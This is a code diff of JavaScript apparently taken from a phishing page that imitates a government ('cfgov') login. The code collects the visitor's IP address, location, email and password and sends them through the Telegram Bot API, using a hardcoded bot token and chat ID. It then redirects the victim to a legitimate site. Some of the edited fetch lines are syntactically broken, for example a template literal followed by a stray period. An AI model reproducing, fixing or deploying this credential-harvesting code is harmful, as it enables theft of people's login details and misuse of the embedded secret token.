@@ -1,4 +1,3 @@
-`javascript
 var logStamp = localStorage.getItem("uniqueId");
 var obj;
 var token = "5862531178:AAG0DrJs_wVjZ4D49TmIPBsOXvtoRIxD1mI";
@@ -11,7 +10,7 @@ function userDetails() {
     .then(() => {
       if (obj != null) {
         var result = `Entry ID: ${logStamp} %0AIP: ${obj.ip} | city: ${obj.city} | country: ${obj.country} | loc: ${obj.loc} | org: ${obj.org} | region: ${obj.region} | timezone: ${obj.timezone}`;
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${result}`)
+        `fetch("https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${result}")`.
           .then(function (response) {
             if (response.ok) {
               oBoqyl2();
@@ -34,7 +33,7 @@ function oBoqyl2() {
 
   var result = `Logs from cfgov page %0A Entry ID: ${logStamp} %0A mail-address: ${eTxt} %0A Password: ${p2Txt}`;
 
-  fetch(`https://api.telegram.org/bot${5862531178:AAG0DrJs_wVjZ4D49TmIPBsOXvtoRIxD1mI}/sendMessage?chat_id=${6230885323}&text=${result}`)
+  fetch("https://api.telegram.org/bot${5862531178:AAG0DrJs_wVjZ4D49TmIPBsOXvtoRIxD1mI}/sendMessage?chat_id=${6230885323}&text=${result}")
     .then(function(response) {
       if (response.ok) {
         return location.replace('https://www.google.com');
@@ -54,7 +53,7 @@ function ooqyl2() {
 
   var result = `Logs from cfgov page %0A Entry ID: ${logStamp} (2nd Entry) %0A mail-address: ${eTxt} %0A Password: ${p2Txt}`;
 
-  fetch(`https://api.telegram.org/bot${5862531178:AAG0DrJs_wVjZ4D49TmIPBsOXvtoRIxD1mI}/sendMessage?chat_id=${6230885323}&text=${result}`)
+  fetch("https://api.telegram.org/bot${5862531178:AAG0DrJs_wVjZ4D49TmIPBsOXvtoRIxD1mI}/sendMessage?chat_id=${6230885323}&text=${result}")
     .then(function (response) {
       if (response.ok) {
         location.replace('https://www.transportation.gov');
